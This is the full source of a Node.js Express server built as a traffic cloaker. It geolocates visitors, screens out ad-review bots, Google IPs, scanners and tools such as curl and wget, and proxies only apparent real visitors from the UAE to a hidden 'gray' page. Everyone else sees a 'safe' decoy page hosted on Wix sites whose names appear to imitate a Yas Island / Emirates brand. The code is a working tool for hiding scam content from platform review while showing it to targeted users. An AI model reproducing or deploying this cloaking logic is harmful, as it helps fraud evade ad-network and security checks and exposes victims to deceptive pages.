const express = require("express");
const app = express();
const axios = require("axios");
const dns = require("dns");
const requestIp = require("request-ip");

// --- Configuration ---
const PORT = process.env.PORT || 10000;

const SAFE_PAGE = process.env.SAFE_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/seaha";
const GRAY_PAGE = process.env.GRAY_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/emaratise";

const UAE_COUNTRY_CODE = "AE";
const GEO_API_URL = "http://ip-api.com/json/";

// --- Trust proxy for correct IP detection ---
app.set("trust proxy", true);

// --- Bot Keywords ---
const BOT_KEYWORDS = [
  "adsbot", "googlebot", "mediapartners-google", "bingbot", "yandexbot", "baiduspider",
  "crawler", "spider", "render", "wget", "curl", "python-requests", "node-fetch",
  "monitor", "uptimerobot", "pingdom", "gtmetrix", "lighthouse",
  "facebookexternalhit", "slackbot", "telegrambot", "discordbot", "preview",
  "ahrefsbot", "semrushbot", "mj12bot", "dotbot", "petalbot", "rogerbot", "exabot",
  "sitecheckerbot", "screaming frog", "netcraftsurvey", "prerender", "headlesschrome",
  "bot", "scanner", "analyzer", "validator", "parser", "scraper"
];

// --- Suspicious User-Agents ---
const SUSPICIOUS_AGENTS = [
  "headlesschrome", "phantomjs", "puppeteer", "axios", "curl", "fetch", "python"
];

// --- Bot Detection Function ---
async function isBot(req) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const ip = req.clientIp || req.ip;

  const isUserAgentBot = BOT_KEYWORDS.some(bot => ua.includes(bot));
  if (isUserAgentBot) return true;

  const hasCommonHeaders = (
    req.headers["accept"] &&
    req.headers["accept-language"] &&
    req.headers["accept-encoding"]
  );
  if (!hasCommonHeaders) return true;

  const isGoogle = await isGoogleRelatedIP(ip);
  return isGoogle;
}

// --- Google IP Detection ---
async function isGoogleRelatedIP(ip) {
  return new Promise(resolve => {
    if (!ip) return resolve(false);
    dns.reverse(ip, (err, hostnames) => {
      if (err) return resolve(false);
      const isGoogle = hostnames.some(h =>
        h.endsWith(".googlebot.com") ||
        h.endsWith(".google.com") ||
        h.endsWith(".googleusercontent.com")
      );
      resolve(isGoogle);
    });
  });
}

// --- Check Real User ---
function isLikelyRealUser(req) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const headers = req.headers;

  const basicHeaders = (
    headers["accept"] &&
    headers["accept-language"] &&
    headers["accept-encoding"]
  );

  const isSuspicious = SUSPICIOUS_AGENTS.some(key => ua.includes(key));
  const hasReferrer = headers["referer"] || headers["referrer"];
  const hasCookie = headers["cookie"];

  return (
    ua.includes("mozilla") &&
    basicHeaders &&
    !ua.includes("bot") &&
    !ua.includes("google") &&
    !isSuspicious &&
    hasReferrer &&
    hasCookie
  );
}

// --- Proxy Function ---
async function proxyContent(targetUrl, req, res) {
  try {
    const headersToForward = {
      "User-Agent": req.headers["user-agent"],
      "Accept": req.headers["accept"],
      "Accept-Encoding": req.headers["accept-encoding"],
      "Accept-Language": req.headers["accept-language"],
    };

    const axiosConfig = {
      method: req.method,
      url: targetUrl + req.url,
      responseType: "stream",
      headers: headersToForward,
      validateStatus: () => true,
    };

    if (["POST", "PUT", "PATCH"].includes(req.method)) {
      axiosConfig.data = req.body;
    }

    const response = await axios(axiosConfig);

    for (const key in response.headers) {
      const value = response.headers[key];
      if (!["connection", "keep-alive", "proxy-authenticate", "proxy-authorization", "te", "trailers", "transfer-encoding", "upgrade", "host"].includes(key.toLowerCase())) {
        res.setHeader(key, value);
      }
    }

    res.status(response.status);
    response.data.pipe(res);
  } catch (error) {
    console.error(`❌ Proxy error to ${targetUrl}:`, error.message);
    res.status(500).send("Internal Server Error");
  }
}

// --- Middleware ---
app.use(requestIp.mw());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Main Route Handler ---
app.all("*", async (req, res) => {
  const ip = req.clientIp || req.ip || "no-ip";
  const ua = req.headers["user-agent"] || "no-agent";
  const path = req.originalUrl;
  const referrer = req.headers["referer"] || req.headers["referrer"] || "none";
  const cookie = req.headers["cookie"] || "none";

  let countryCode = null;

  try {
    const geo = await axios.get(`${GEO_API_URL}${ip}`);
    if (geo.data?.status === "success") {
      countryCode = geo.data.countryCode;
    }
  } catch (err) {
    console.error(`🌐 GeoIP lookup failed for IP ${ip}:`, err.message);
  }

  const isFromUAE = countryCode === UAE_COUNTRY_CODE;
  const isDetectedBot = await isBot(req);
  const isRealUser = isLikelyRealUser(req);

  // ✅ Debug log
  console.log(`\n📥 Incoming Visitor`);
  console.log(`- IP: ${ip}`);
  console.log(`- Country: ${countryCode || "Unknown"}`);
  console.log(`- UA: ${ua}`);
  console.log(`- Referrer: ${referrer !== "none" ? referrer : "⛔️ None"}`);
  console.log(`- Has Cookie: ${cookie !== "none" ? "✅ Yes" : "❌ No"}`);
  console.log(`- isBot: ${isDetectedBot}`);
  console.log(`- isRealUser: ${isRealUser}`);
  console.log(`- Final Decision: ${isFromUAE && !isDetectedBot && isRealUser ? "➡️ GRAY_PAGE" : "🔒 SAFE_PAGE"}`);

  await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 500) + 100));

  if (isFromUAE && !isDetectedBot && isRealUser) {
    await proxyContent(GRAY_PAGE, req, res);
  } else {
    await proxyContent(SAFE_PAGE, req, res);
  }
});

// --- Start Server ---
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`- GRAY_PAGE: ${GRAY_PAGE}`);
  console.log(`- SAFE_PAGE: ${SAFE_PAGE}`);
});
